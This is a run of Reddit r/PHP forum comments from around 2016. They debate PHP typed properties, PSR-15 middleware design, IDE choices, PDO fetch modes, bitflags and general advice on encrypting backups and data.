&gt; There is currently no known value in adding a type to a constant. subclasses can override constants, they are polymorph if you use static::CONSTANT
Just like 1 hour ago I was actually looking at Hoa the first time and the iterators caught my interest. There sure are some useful implementations in there, but the fact that many of them are just renames of the official PHP iterators makes me not wanna use them :( It's good that it exists, anyways, it gave me some good ideas for future libraries. Are you the author? Can you tell me why all SPL iterators have been renamed/moved to the Hoa namespace instead of just using the SPL ones?
But now that we have fixed types, why stop them being used in properties specifically? Might as well do it right if you're going to do it. _edit_ that sounded a bit argumentitive, sorry. I'm obviously in favour of types, so I'm looking for the other side's perspective.
because I need dynamically typed language that provides **optional** type safety features. I will use type safety in important parts of my application (primary entities) and maybe skip in some less valuable parts of my code (infrastructure).
I know why it's useful. I completely support the type safety features. I'm waiting for the *inevitable* "THIS IS LITERALLY JAVA" shit that comes in whenever a feature such as this is proposed/voted on. 
 array_map($x ==&gt; $x ** 2, [1, 2, 3]); instead of array_map($x =&gt; $x ** 2, [1, 2, 3]); Just because we need to add extra parentheses for arrays: $x = 2; $arr = [ $x =&gt; $x ** 2, // 2 =&gt; 4, ($x =&gt; $x ** 2) // closure ((int $x) : int =&gt; $x ** 2) // type hinting in closures ] But I really want to get async/await and pipe operator...
Whats wrong with having both options? class Foo { public int $int = 1; public float $flt = 2.2; public array $arr = []; public bool $bool = false; public string $string; public callable $callable; public stdClass $std; public OtherThing $other; public $mixed; } you can still do mixed
But isn't it too smooth? ...Dun dun dun
&gt; Exception code: 0xc0000005 That's an access violation, likely a null pointer access ... as already guessed. On windows, you probably have a thread safe build, where it is expected that each thread should have it's own copy of the interpreter, this includes module globals. Writing the globals of another thread is dangerous, and has undefined behaviour (we don't support that). Put the code online somewhere, and I'll look ...
Other dynamically typed language like python or ruby don't have type hinting. But they have strong dynamic type system, not weak like in PHP. And this is much more safer than just type hinting. (i.e. variables and operations doesn't change types). But dynamic types without any type safety is a hell. 
I don't know how you got that out of my expectation that a senior dev have a very rudimentary level of knowledge about fundamental programming concepts. However, if you didn't know what flooring was and you chose to exit my interview, I'd be eternally grateful to you for sparing me the awkward duty of informing you that you weren't even qualified to be an intermediate developer.
 didn't see an option for specifying a built-in class public DateTime $when; public ArrayObject $stuff; public SplHeap $heap; would those work?
Yes they will. From the Reflection secion... public stdClass $std; public OtherThing $other; The type hinting system originated with array and classes. The scalar stuff is just the latest stuff that everyone likes to use for demos. However, anything that is type-hinted will still work with classes (of all kinds) just fine.
Isn't this the project with absurd levels of hyper-abstraction that used to encompass 200 separate git repositories? EDIT: [yep](https://github.com/steve-rodrigue/ids/blob/master/src/iRESTful/Ids/Domain/Uuids/Factories/UuidFactory.php)
It's not open sourced yet but my explanation [here](http://www.reddit.com/r/php/comments/4k3jz3/magic_box_build_laravelbased_rest_apis_faster_with_repositories/d3cil2g) is what fuzz/api-server gets you in this context (the ResourceController). Thanks for catching that! I'll update the readme to be clearer. 
Yep, you answered my questions and it's a good reason, thank you :) No offense, I believe Hoa is pretty awesome!
To be fair the language has adopted a lot of features from Java. I don't think this is a bad thing though as Java certainly has a lot of good features
What's ugly about it? Personally I think this is an extremely straightforward change 
No its not.
I have no idea. EDIT: I can still see the contents of OP, but on other accounts it merely says [removed]. If I had deleted it, the contents would be obscured to myself. It, therefore, must have been a moderator.
No. actually closing a file with ?&gt; is bad practice and is one of my interview questions. http://www.php-fig.org/psr/psr-2/ &gt; The closing ?&gt; tag MUST be omitted from files containing only PHP. 
This is one of the most pretentious comments I have ever read... &gt;I'm pretty skeptic about types and naming What does that even mean? Pretty skeptic about types and naming things? You mean you don't trust type and names of things? You find a question asked and replied in a casual manner, and you barfs all your "wisdom" all over it to make yourself feel smart.
I went through the same IDE steps - Eclipse was the worst by far. I still remember looking for wordwrap in Eclipse (just visual, so no content is concealed) and finding out that Eclipse does not support any such feature because of how it works internally, and that there are no plans to support it. PHPStorm has its issues, but definitely the best IDE so far.
And most of this features was invented way before java.
Yep definitely. Early Java was as rough as early PHP
Maybe I read the RFC wrong, but the way you would like to see it is exactly how it works, no?
&gt; they are polymorph if you use static::CONSTANT Because constants that change are definitely a good idea.
are you referring to PHP's type coercion
God I hate redmine so much. We're using it for same reason and I'm trying to push for JIRA (as we're also using bitbucket so a 3-way integration would be nice)
See https://phpdelusions.net/pdo/objects . Apparently you can fetch database rows as any class object (not just stdClass). This should do the mapping part. 
Thanks.!
Oh lemme try array_walk_recursive($crazy_multi_dimensional_array_of_strings, 'ucfirst'); or of that's too easy $crazy_multi_dimensional_array_of_strings = call_user_func($self = function ($val) use (&amp;$self) { return is_array($val) ? array_map($self, $val) : ucfirst($val); }, $crazy_multi_dimensional_array_of_strings);
One of the cool feature of Redis for actual business logic is the "Sorted sets" which make it real easy to create rankings ; it is pratical (and actually used) in online gaming for instance.
Perhaps there is a limitation with the parser that doesn't allow it after the variable when using assignments. E.g.: private $count: int = 0; vs private int $count = 0;
You could use default classes to type hint. I used stdClass all the time. 
&gt; Did you ever seen code responsible for searching for something basing on many different criteria? Have you ever seen ... $searchingContext -&gt;getQueryBuilder() -&gt;andWhere('e.age &gt;= :minimalAge') -&gt;andWhere('e.age &lt;= :maximalAge') -&gt;setParameter('minimalAge', $criteria-&gt;getMinimalAge()) -&gt;setParameter('maximalAge', $criteria-&gt;getMaximalAge()); So why can't the `buildCriteria` pass in associated parameters? I am not a fan of `setParameter`. Mainly just curious. Other then that this looks interesting.
Yes. God forbid that you hire an employee that is good at his job and learned the skills necessary to accomplish it. We all know that that person is probably incapable of learning something new ever again because he used up all of his skill points learning his last position. It is much better to insist that your web developers spend their weekends doing kernel patches and your DBAs have an in-depth understanding of machine learning algorithms. I wonder what irrelevant holes there are in your background that we could nitpick and automatically disqualify you from career advancement?
Types matters. Strictness matters. PHP being a loosely typed language doesn't mean you should leave all the good practices and do `"true" == 1` or increment an integer forever. There are many circumstances where your approach will give you headaches. It would be great if people could leave their PHP 4.0 mindset and use PHP the way it's supposed to be used before they decide to bash it. &gt; What does that even mean? It means someone that is supposed to be intervieweing senior developers lack the fundamental knowledge such as knowing what is a function and what is a language construct. It is not that hard to learn differences between a function/method, a closure/lambda, a class/object, heck even a facade/alias. This is why everything is "misnamed" and everything is "disorganized" on PHP ecosystem. If pointing the mistakes makes us elitist braggers, then so be it. &gt; "wisdom" all over it to make yourself feel smart. If I wanted to make myself feel smart, I wouldn't pick such an username in first place. I'm a terrible developer compared to half of /r/php and I know it. I'm not bragging about anything or trying to make myself look smart. I'm simply stating a fact. Either the answer or the question is wrong. It shouldn't be that hard to grasp really. "Me can't finz senior devloperz. :((( They can't answerz mah questins." Nope, it means your HR department sucks and they invite anyone whom sends them a resume for an interview. Anyone with one hour of programming experience would know the answer. `floor` is a word in English and a concept in elementary level math, it doesn't even look like a programming related question in first place.
http://phabricator.org/, because there are memes and a "English Very Wow" locale. Also it's free, open source, written and PHP, hosting is available, and is damn fraking awesome to use.
The article seems to center somewhat around a programmer's use of a vulgar word in a code comment, and whether or not that is appropriate. The argument I would make is that a certain amount of cultural awareness and - more importantly - a fair amount of restraint would keep a "professional" programmer from doing that. Restraint is often what we lack. We may think that it's perfectly acceptable to use certain language, or engage in some other behavior that others find questionable, but the ability to hold back is what makes the professional. It is what separates a professional programmer from one of my teenage children. They may be right, but being right isn't always enough. Sometimes it's better to just keep your mouth shut.
[The RFC specifically says it is because it is difficult to read when combined with an assignment using the ternary operator.](https://wiki.php.net/rfc/typed-properties#syntax)
Lol, question asked, is asked, question is answered. Response: downvotes.
Because people suck, but more to the point I don't think a NullPointerException is appropriate or even descriptive of the actual error when it occurs (unless an actual null is passed - then maybe). A TypeError is EXACTLY the right error because it's a violation of the type when you are trying to assign a string to an int for example.
There's only so much you can learn by yourself. I guide myself by a simple rule: if you're the best in your team, it's time to switch teams.
Constants can change... at compile time. They are only immutable at runtime.
[Yes.](http://php.net/manual/en/function.floor.php)
To answer the question in the title: Never.
&gt; you can easily access second item title by __::get($shop,'1.title'); But what's wrong with $shop[1]["title"]? Except maybe some syntactic sugar?
In this case, it doesn't matter. What makes ||, or, &amp;&amp;, and tricky is that the assignment operator has higher precedence than 'and' and 'or', but lower precedence than || and &amp;&amp;: $a = false or true; // $a is false because = was done before 'or' $a = false || true; // $a is true because || was done before = To answer your direct question, I don't know of a case offhand where you'd specifically want to use and/or. I actually kind of hate this, because I prefer the aesthetics of the words over the symbols, personally.
I always use or/and
I find it more pretty, and cool
Check [Omnipay](http://omnipay.thephpleague.com/) for inspiration.
It is highly unlikely to happen. 
I had a look at a couple of the modules, and each one had the .... &gt; ....Sorry for this inconvenience. Be **ensured** we are working hard to fix this. 
Yep, the few times I've had to xor something it always bothers me.
Thats a pretty simple function! How do people not remember it?
So...I'm still working on getting my first job but was able to answer this...may I be hired please?
Nope its not necessary. Local variables are usually short lived, you wont have to worry about reassigning them to incorrect type if you follow good programming practices. For class properties, they get altered more frequently and can occur anywhere inside or even outside of a class method. In this case, it makes sense to guard the class properties by forcing it to be a certain type. There is a reason why having typed properties is useful, but having typed local variables is useless. If you really need to make local variable type static, maybe use a keyword to enforce that, such as 'let' or 'var'. Then you have a syntax such as : let $b = 1; //type is inferred to be int, no need for explicit declaration $b = "Hello World" //throws an exception In this way, the variable type is static and it is inferred, which I call local variable type inference. There's just absolutely no need to declare local variable types. Even in my .NET and swift application I never declare variable types. I always use var/let keyword, declaring local variable types brings nothing on the table other than additional typing and harder to refactor. The reason why programming in JAVA is so painful for me right now is that, you have to declare variable types for even local variables. Hopefully, this will fix the problem: http://openjdk.java.net/jeps/286
$shop[1]["title"] this will cause error if any of the indexes is not exist while using __::get will return null which you can always run check easily against it
Nice. Best of luck with your tool project!
This actually looks easier. Thanks.
I would strongly advice you to watch this video " A Talk About Naming Things Talk" https://youtu.be/2ytO9XqEr3A
This led me to the blog post. Was a good read between y'all and then the post.
* drop mic *
he doesn't seem to have taken part in [the mailing list discussions](http://php-news.ctrl-f5.net/search/typed%20properties)...
My computer at work is a 12Gb 2010 core2duo iMac. PHPStorm 2016.1 runs fine on it alongside Apache, PHP, MySQL, ElasticSearch and the usual browsers and other smaller things. At home I use it on a recent 8-core AMD with much more RAM and it's about the same. It does what it does fast on both.
I enjoyed it thoroughly and it was a nice change of pace compared to having to look at yet another person sitting behind a desk, doing the whole 'I'm going to explain something to you while staring dull into the debts of your soul' thing. Keep on going, and haters gonna hate.
No big deal. Use enough languages and they inevitably start to blend together.
I'd love to have Anthony participating in the php community again. I think he brings a lot and has made me a better programmer.
There seems to be a problem with PHP-FIG where a person who submits a proposal is also going to be the implementer of that proposal. This means that submitter is very attached to the specific proposal they submitted and that suggestions to the spec might very well go into the void. As we have seen. Would it not be better to "decouple" the submission of the proposal from the implementation of it? This means that there will be initial discussion around a PSR by the community but that the actual spec compiled by a small task force of FIG developers (say 3 people or so). 
your forgetting about the CI injection of middlewares with responses that cannot be modified.
I paid attention to the video. I watched the entire thing attentively. My point is that, in my opinion, the majority of the content in the video serves to distract from the topic of discussion. 
Like what? As far as I know, there's nothing in typescript and javascript that wasn't already planned for javascript before it was in typescript. A major premise of typescript is forward compatibility with new versions of javascript.
that's PHP for ya \_()_/ 
In this case, the proposer is not the implementor. Woody is describing an approach that appears "in the wild" already, and has not (as far as I can tell) modified it in any significant way. 
Neither did saying (about me) ["honestly, I think he has demonstrated himself as a bigot. Don't like that name calling? I don't care."](https://twitter.com/ircmaxell/status/689794572369686528) But whatever, some of us can separate "technical" talk from "political" talk.
It wasn't the knowledge about floor() or ceil(), it was what you said here and earlier. Its a personality type. The pattern of your thinking ... I agree about what you said about the level of knowledge, but the How you went from there is a known type that is in general hard to work with. Aah, never mind, see, you won't get what I am saying, and you will insist I missed the point of the discussion. 
Moooooom, *he* started it!
Sorry for my bluntness, but passing around arrays with parameters is not "an easy to use, clean API". At the very least you could define the array keys as constants but that still wouldn't make it easy to use and clean, just less error prone. Ditto for [defining possible actions as strings](https://github.com/jordanbardsley7/biller/blob/master/src/Factories/StripeActionFactory.php) passed [via __call\(\)](https://github.com/jordanbardsley7/biller/blob/master/src/Providers/Stripe.php).
they likely don't know what parentheses are...
JSON WEB TOKENS WITH SEKRETS
Nice try, but you'd do better to go after attackers, not defenders. You're like the person who sympathizes with the bully who gets punched-back, and wants to punish the bullied kid who punched him.
I agree with most of his points except this one: &gt;The usage of __invoke rather than a named method presents an interesting problem. It was chosen because it allows for compatibility with anonymous functions, and hence backwards compatibility with a lot of pre-existing middleware. However, this also prevents any implementing middleware from using __invoke for other means. &gt;But further, it also prevents distinguishing between client and server middleware. Since both use the same root interface, it forces the distinction to happen at runtime inside of the implementation. This is mentioned explicitly in the proposal by saying the middleware should throw an InvalidArgumentException if the wrong type is passed. Maybe I'm approaching it from a Python/WSGI viewpoint, but WSGI middlewares are essentially the same thing as these. Now, before I go further, I get WSGI is a protocol (and pretty low level) and PHP is a language. But the idea is the same regardless. Here's an example WSGI app: def wsgi(environ, start_response): start_response('200 OK', [("Content-Type", "text/html")]) return ["My first WSGI application"] It's basically `main` for your web app. It's what the server calls. If you want to add transformations to the request or the response transparently, you simply implement the same signature in the wrappers: def make_angry(wsgi): return lambda env, start: list(map(str.upper, wsgi(env, start))) And the server in unaware it's not talking to the actual app, and the actual app in unaware it's being modified. More importantly, it doesn't matter what order the middlewares are applied. Mix client and server middlewares, it doesn't matter. It's all transparent no one needs to know *who* they're talking to, only that they're talking to a WSGI application. More importantly, the only interesting thing the middlewares can do is take in a request and generate a response. `__call__` (or rather `__invoke` in the PHP sense) *is* the only logical interface. Object, function, don't matter. It takes a request and generates a response. Nothing about pushing, handling, nexting or factorying. Instead of a single transparent interface, Anthony is proposing at least two almost identical interfaces that look like they compose awkwardly.
Can you give an example of a job that requires type hinting?
Yeah no problem, I appreciate the input!
Does this help to minimize database request in any way? With APIs presenting data at once in a flat format, Eloquent can end up making a ton of calls to the database if the model has a number of relationships. For example, I just built an API using Eloquent models (on a database whose structure I had no say in, for the record) and any given item ended up having up to 51 database selects, eager loading and all. I ended up creating a custom join query for this, of course so that each item had one - three selects.
Python doesn't have static typing and PHP does -- that's one significant difference. And the second is that is doesn't solve all the problems; for some middleware the order matters significantly (like if you are caching). 
Hmm Thats a shame. I know its hard because having existed first you are clearly in the right. But that doesn't mean you shouldn't back down on this. I feel like someone needs to swallow their pride and change their name. Just my 2 cents Your framework looks really nice by the way.
PostgreSQL makes a great key value store: look at the JSONB column type
There are places where it is extremely valuable to encrypt data. Such examples include the laptop left in the back of a taxi which had confidential files stored on it. The media - doesn't understand the difference. And to be fair, many vendor aren't helping. There are several encryption vendors who jumped on the Ashley Madison leak claiming their desktop encryption product would have prevented it from happening. Furthermore, auditors just make this worse. I have a series of financial records sitting on a server in a datacentre. There are eight different locked doors between the outside world and this server. I need to present passcodes, finger print scans, and sit still and pose for the camera on the way in and on the way out. There is an immutable log of every access made into the room. So when this idiot from PWC comes in for a security audit, does he ask how the website is penetration tested, or whether we're doing updates regularly, or anything actually practical? No. He asks firstly if we have a desktop antivirus product installed on said server (McAfee in Linux.. ugh) and then if we are using full disk encryption. Which, he fully understands, is designed to address the threat of someone physically stealing a hard disk from a server. There are valid solutions here, see /u/timoh's answer. But the majority of practical situations involving media crying "encryption" is just the media not knowing what they are doing.
I'm not really sure why this solution makes more sense than either: 1) Just doing it C style, which PHP supports already. define('PERM_READ', 1); define('PERM_WRITE', 2); define('PERM_EXEC', 4); $rw_perm = PERM_READ | PERM_WRITE; $rx_perm = PERM_READ | PERM_EXEC; $has_r_perm = $rx_perm &amp; PERM_READ ? True : False; Yeah yeah, globals are bad. You can wrap them in a class if you prefer to mock a C enum if you prefer. class Perms { static public $read = 1; static public $write = 2; static public $exec = 4; } $rw_perm = Perms-&gt;read | Perms-&gt;write; $rx_perm = Perms-&gt;read | Perms-&gt;exec; $has_r_perm = $rx_perm &amp; Perms-&gt;read ? True : False; 2) Just wrap some booleans up in class. Add methods, or just leave it all public and use it like a struct/record. class Perms { public $read = False; public $write = False; public $exec = False; } $rw_perm = new Perms(); $rw_perm-&gt;read = True; $rw_perm-&gt;write = True; The memory savings you might get from compressing a bunch of booleans into an int are really very trivial compared to, say, the cost in memory of running the PHP interpreter itself. If you write a library that defines a bunch of stuff to wrap up your bitfield, though, I'm willing to bet in almost any scenario you'll end up using more RAM holding the relevant PHP book-keeping for your library than you'll save in a few compressed booleans. (And certainly you'll take a trivial hit to performance.) What are the other advantages really? I'm not really convinced it's any easier to write or anything than just making custom ones as-needed like above.
could you show me an example of this with 31 flags? The point of this library has nothing to do with RAM. 
I mean I could, but do you really want to just see one of the previously posted code segments with more lines? (And if you're willing to accept PHP code that's restricted to x86_64 architectures I can give you one that goes up to 63 flags if you'd like.) It'll be a lot of writing and obnoxious boilerplate... but so is your library. Flags like this will always require the user to provide a complete set of names for the flags given that they can't be precomputed in the general case, so it's always going to include a lot of just listing names for the flags. But there's one strength to using the bitwise operations directly: it's basically a free DSL for querying the state of the flags as a unit rather than independently. Example: collect all permissions with read or write permissions or both $r_or_w = []; foreach($all_perms as $perm){ if ($perm &amp; (PERM_READ | PERM_WRITE)){ $r_or_w[] = $perm; } } Collect all permissions with read or write permissions, but not both $r_or_w = []; foreach($all_perms as $perm){ if (($perm &amp; PERM_READ) xor ($perm &amp; PERM_WRITE)){ $r_or_w[] = $perm; } } Collect all permissions exactly equal to read+execute (Do not allow read+write+execute) $r_or_w = []; foreach($all_perms as $perm){ if ($perm == PERM_READ | PERM_EXEC){ $r_or_w[] = $perm; } } Collect all permissions without write permissions, but at least one other permission set $r_or_w = []; foreach($all_perms as $perm){ if ((! $perm &amp; PERM_WRITE) &amp;&amp; ($perm)){ $r_or_w[] = $perm; } } etc.
&gt; it's basically a free DSL for querying the state of the flags as a unit rather than independently. now you understand the point. querying &amp; storing, both. as for "obnoxious boilerplate", I think you are way off the mark. Yes - I want to see it with "more lines" - so you can understand that you don't need more lines with this library. Compare this to the number of steps you have to take to add a new flag to a database table with all the Models, ORM changes, etc &amp; I think you'll understand the point of this.
Yes, because its not that many. Only in some ternaries operations
The only bit that is a bit awkward bit of the FIG proposal is the `callable` parameter, IMO. That one could be interfaced, and it can just be a function (`__invoke`).
No, and that's one of the problems the article points out
Common things like this don't work properly with 'or': $need_update = $profile_changed || $password_changed;
_I'm not a security expert, it's just how I understand things, so take this with a grain of salt. Also, if somebody with more knowledge in the field finds something from the following as wrong and/or plain stupid, please correct me. ( cc /u/sarciszewski )_ &amp;nbsp; &amp;nbsp; In 9 of 10 cases, it is a misunderstanding of the technical aspect from the media and they refer to hashing as encryption. &amp;nbsp; Very rarely there are situations where the source of the data leak is not a live database, but a backup archive, an internal storage server which contains archived data, etc, which indeed should be encrypted. &amp;nbsp; &amp;nbsp; For example, if you store your employees data on a internal server because you needed it now and then for accounting or something, you should encrypt it and when I say "encrypt it" I refer to that particular file, not the entire HDD. HDD encryption will be equal with 0 after your machine is live, because the data is decrypted at boot time. HDD encryption can help you if your laptop is stolen, or if some ninja stole a HDD from your data center. &amp;nbsp; &amp;nbsp; Also when you store your backups, you should encrypt them before they leave your machine (_i.e: any backup that goes over the wire, should be encrypted_), even if you store them inside your own network. I also rotate the keys each 3 - 4 weeks and throw away the old one. &amp;nbsp; &amp;nbsp; I find encrypting data inside a live application (_i.e: DB, file system, etc_) futile, because your application will need to access that data, thus will need the key to decrypt it. So your encrypted data and decryption key will live side by side, which would make encryption futile.
Found what `PDO::FETCH_GROUP|PDO::FETCH_UNIQUE|PDO::FETCH_ASSOC` does the trick, but seems like FETCH_UNIQUE can be left out.. But better safe than sorry. Thanks!
The way PDO builds objects is efficient, as it's C, but architecturally it's not that great. Ideally you'd have an interface to take raw data and produce objects, and allow the implementations of that transform to vary depending on your object's needs. PHP has a plethora of serialization interfaces like JsonSerializable, \_\_wakeup/__sleep, __set_state and all of them have their own quirks. None of them is quite allowing the class to take in raw data and build an instance entirely on its own, without PHP helpfully injecting state into properties before you have a chance to do a thing. And this article suggest yet another way of controlling what's set... via __set (what about serialization, though), which is a hack. I'm not sure PDO supports any of the dedicated serialization/deserialization interfaces above at all. So if you value performance over control, go for FETCH_CLASS, but my experience says "keep control". Naive mappings that take columns and write them into same-name fields looks attractive... at first. But over time the way your object is represented in memory starts to really differ from the way it's represented in the database. You can have fields in the database purely for lookup, which don't represent needed state in memory. And likewise, some state in memory might be transient, and unnecessary in the database. Field formats may differ, too. What comes as a string from SQL, a DATETIME value, you might want it to be a DateTime object in PHP. And so on.
&gt; One of PHP's uniqe selling points is dynamic typing. This really isn't true - Python, Ruby &amp; JavaScript are all dynamically typed &amp; often used for web backends. I'd say that the ability to mix traditional dynamic code with static parameters / return types is PHP's real selling point.
Article says the fundamental problem is that inner middleware **cannot** define the response. This does not seem to be true. As you also said, there is nothing stopping the inner middleware to ignore the passed in response and define new one instead. Other way to say it is the inner middleware can ignore the passed in response and **can** define a new one. 
If the inner middleare does define the response, it throws away any changes made by outer middleware prior to calling the inner. This means that outer middleware will break. This is why I said it's only robust if you follow the "only modify the response after `$next` guideline, at which point why pass `$response` as a parameter at all...
That's exactly what the problem is. Outer middleware does stuff to the response, calls $next and inner middleware throws it all out, possibly breaking outer middleware. If the passed in response is only supposed to be a template for new responses then the interface should define it as such. E.g. pass in a factory or builder or template. Or use $frame-&gt;factory as suggested in the article. Existing middlewares do not treat the passed response as just a template, causing potential bugs. Edit:I meant to teply to tuupola above...
I meant when you're trying to access it without it being initialized
You are right. I could fall on your example
Ok makes sense. So in layman's terms the fundamental problem is that current proposal enables those who do not know what they are doing shoot oneself in the foot. 
Focus on building fast and you will hate yourself a year later when you need to maintain that project. And mixing snake and camelCase? My eyes hurt now... I'm outta here
Brackets I guess. Using PHPstorm atm, but I could fallback to brackets no problem =)
I believe there is no strong competitor against PhpStorm nowadays, it is clearly the most advanced IDE. However, it requires significantly more powerful hardware than Geany. If you have relatively new machine it would not be a problem. P.S. You should really think about moving soon to Ubuntu 16.04, 15.10 will stop receiving updates in few months.
Like last time, why not post that directly to the mailing list instead of your own blog? It just sounds like you don't want to put your argument at the same level as the other people
I learn so much more when I dive into more advanced tools and PHP frameworks. When I moved from my simple editor to PhpStorm that's when I went from being a freshman to sophomore in my coding journey. The automation, hinting, built-in deployment tools, etc.. all come together nicely - nudging us in the right direction.
PhpStorm (or IntelliJ IDEA with their PHP plugin; they're the same thing) is very good. It's resource heavy, but not so much that I find it an issue in practice. And it's not free (in both senses of the term). If that's a red line for you, then you will have to look elsewhere. One of my colleagues uses NetBeans, and it seems like a pretty acceptable choice for PHP. Maybe look into that?
1. All of the points that I made were made on list and ignored. I simply put the argument into my own words. I said very little that was actually "new". 2. I refuse to participate directly in communities that do not have a Code of Conduct in place. So I will not officially contribute to FIG since they do not. 3. On the mailing list, discussion points and arguments tend to get "buried". Simply look at Ross Tuck's points in that thread. They got buried and never addressed again. 
Well-considered and well-discarded, you mean. FIG is notoriously shut off to competing designs, and the de facto response to them has always been more or less "start a new proposal and GTFO of ours", under the hilarious umbrella of being "counter-productive" or "not the right stage in the process to make major changes" (sunk cost fallacy).
I disagree with this. You shall only _add_ headers _after_ response creation (in all middlewares). Before response creation is only fine if you want to skip the responder callable (i.e. caching). And Anthonys proposal is exactly enforcing this. If you want defaults, then you shall add the default later if there's no value yet for that header. Also, regarding caching: then do not add the caching middleware to the responder or add another middleware signaling (some variable, don't know) that caching shall be disabled on that route specifically.
This article here is the definition of content theft. Here is the original: https://www.sitepoint.com/how-can-the-elk-stack-be-used-to-monitor-php-apps/?utm_content=buffer2ff1b&amp;utm_medium=social&amp;utm_source=facebook.com&amp;utm_campaign=buffer
From the part of the article referring to the exception handling: &gt; The critical thing to note here is that the partial response is never used. Nope, PSR-7 isn't completely immutable. Anything written to the stream would be a problem.
&gt; will you come to: http://www.bgphp.org/ ? Probably not this year. :-/ After a terrible travel-induced illness several months ago, I decided that this year I won't be going to conferences that I have to fly to. Driving-range from Nashville only. Sorry!
I don't see anything in this article that actually contradicts anything Anthony said. You provided no examples of things made possible using the existing signature that wouldn't be by his proposal, while simultaneously ignoring all of the benefits he pointed out that go with the alternative design. Your primary point - that this signature avoids coupling to a specific implementation - was already addressed in his article (in multiple ways, actually). You seemingly hand-waved these away without talking about them at all, minus this little gem at the end: &gt; The best dependency inversion we can have is not needing a container or factories. ...which is a completely unsupported premise that presupposes that we all think factories are the devil or something? In short, I think this was a really poorly thought-out response that you probably put together in a defensive state of mind. I suggest taking more time to construct a better one that addresses the specific points that were brought up in detail, without glossing over anything.
I understood from the article if you modify the *$response* after calling *$next()* you're all good. I do not find that especially difficult. Then again I cannot speak for others.
Sounds like you want a three-party Diffie-Hellman: * Alice generates a X25519 keypair (admin) * Bob generates a X25519 keypair * Charles generates a X25519 keypair * When Bob sends a message to Chris, he takes Alice's public key and Charles' public key, multiplies them together (over curve25519), then multiplies Bob's secret key to get the shared secret. * When Chris receives Bob's message, he uses Alice's and Bob's public keys with his secret key to arrive at the same shared secret. * Alice is an administrator who doesn't need to actively get involved, but can decrypt all communications. Note that this requires encryption to take place *outside* of web pages to be secure: Mobile apps, chrome extensions, or desktop apps only. Public keys need to be pinned and logged in a publicly auditable append-only data structure ([example](https://paragonie.com/blog/2016/05/keyggdrasil-continuum-cryptography-powering-cms-airship#after-fold)).
&gt; I'm saying he gives the topic at hand great consideration, not that others always consider his words. Fair enough; my mistake on the misinterpretation of that comment. &gt; So when you say "FIG is notoriously shut off to competing designs" I'd be curious to see where patterns in prior discussions lead to believe that. The caching proposal is a prime example. Coincedentally, [Anthony was one of the ones ](http://blog.ircmaxell.com/2014/10/an-open-letter-to-php-fig.html) who got dismissed out of hand there, as well. But there were plenty of others who received the same treatment.
I agree completely, don't have answer to your question:)
It's gonna be totally great to watch FIG spend 6 months debating how we can share middleware that are about 5 lines of code to begin with. 
It's done this way on purpose to prevent automated log ins. 
happy to be removed from that situation?
[FETCH_UNIQUE](https://phpdelusions.net/pdo#unique) is what you need.
&gt; I refuse to participate directly in communities that do not have a Code of Conduct in place. Oh, that explains a lot. I wasn't aware that you made that particular decision.
&gt; Don't encrypt backups, seal them. &gt; Seal in this case is shorthand for "encrypt with a public key so only the corresponding private key can decrypt it". That is what we do, although I didn't know about the "seal" term. &gt; Keep the decryption key well protected (airgapped). What I ended up doing some time ago, is split the private key in 3 and give each piece to a different person from the team. Because we all work remotely, each piece is _sealed_ with the (_personal_) public key of each person before sending it to them. &amp;nbsp; Never needed to actually do it except for exercise, but after the private key is used, we rotate the keys, throw away old data and take the process from the beginning. &amp;nbsp; &amp;nbsp; For those wondering, at random times each person which has a piece of the key is asked to give a check-in on a private service. If (s)he misses 3 consecutive check-ins, we assume that something bad happened to him/her (_accident, illness, etc_) and we force a key rotation and full backup (_the rest of the backups are actually snapshots; we do a full backup only after a key rotation_). &amp;nbsp; &amp;nbsp; The only downside is that 3 persons (_which sometimes live in different time zones_) must gather to unlock a backup, which will take time and in case of emergency you want this process to be as fast as possible, but is a trade off which I can live with.
The most important thing to know: No one should care what provider is being used. They should be able to plug a provider in. The only thing that matters is the billing. :D
I see what your saying though, I think the recommendation above to use Value Objects would solve that issue though!
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
XML - Annotations are big no for me. Code looks very messy and if u make a mistake (in annotaion) messages arent wery helpful. If your table has a lot of columns, XML (and YAML) gives me nice compact view. If i make a error in XML my IDE shows me it immediately. It comes XSD so i can check very fast possible fields, columns and their possible values without searching it online. Additionally it allows me to split my entities into base class and proper class . Base classes has only definitions of properties, getters and setters (or these methods to collections management). Proper classes has only "complex" methods. For example: class User extends Base\User { public function getFullName() { return $this-&gt;getFirstname() . ' ' $this-&gt;getSurname(); } public function __toString() { return $this-&gt;getFullName(); } } If method is not defined in proper class then i know its simple getter or setter (or these methods to collections management) Obvoiusly in context of OOP this partition don't make any sense but working with this is SOOOO much easier.
https://en.wikipedia.org/wiki/Shamir's_Secret_Sharing - typically cryptographers aim for parameters near "3 of 10" need to be available to recover the secret. This assumes a certain degree of manpower.
Could you explain why doing math with multiple secure key-pairs to generate a derived key-pair doesn't make them less-secure? I Thought this sort of thing was frowned upon in security, like double hashing.
Jira for granular task tracking but BlueMesh for higher level product management. Integrate well and BlueMesh does a good job of showing dependencies and potential bottlenecks. 
&gt; you wont have to worry about reassigning them to incorrect type if you follow good programming practices. If everyone was a perfect coder that never made any mistakes, this statement would hold true. I'd *love* to have **optional** typing for variables so that I can add an extra layer of not-shooting-myself-in-the-foot protection to my code.
This is the service locator pattern. Many [consider it to be an antipattern](http://blog.ploeh.dk/2010/02/03/ServiceLocatorisanAnti-Pattern/).
That's a problem everywhere isn't it? If you start outputting things *before* the exception occurs, there's not much you can do about that unless you buffer your response. 'Course, you could probably make a buffering middleware too.
I know I don't like factories. I'm not going to try to back that point, but I welcome anything that avoids them.
&gt; And give the volume of suggestions on PSRs, that some are not-accepted is no more a sign that FIG is "notoriously shut off to competing designs" I think it's disingenuous to imply that only "some" are not accepted. Can you give an example where a dissenting external opinion about overall proposal design ever significantly influenced the resulting recommendation? The only cases I can think of are those in which internal debate over some topic was already raging, and said opinions were basically cheer-leading (e.g. immutability or header bags in PSR-7). Other examples, like the ones I mentioned, received a polite "thanks, but no thanks" and that was that. In fact, Larry seems to be combating this very problem on the mailing list right now. He's getting a lot of push-back for suggesting that alternate designs receive adequate consideration. When put on the spot, Woody fell flat with his response to Anthony, offering nothing of any substance to repudiate what are *really, really good points* - leading me to believe that this is heading in the same direction as the cache proposal. Someone gets really invested in their baby, and maybe gets one or two other members on their side, and that's that. Game over.
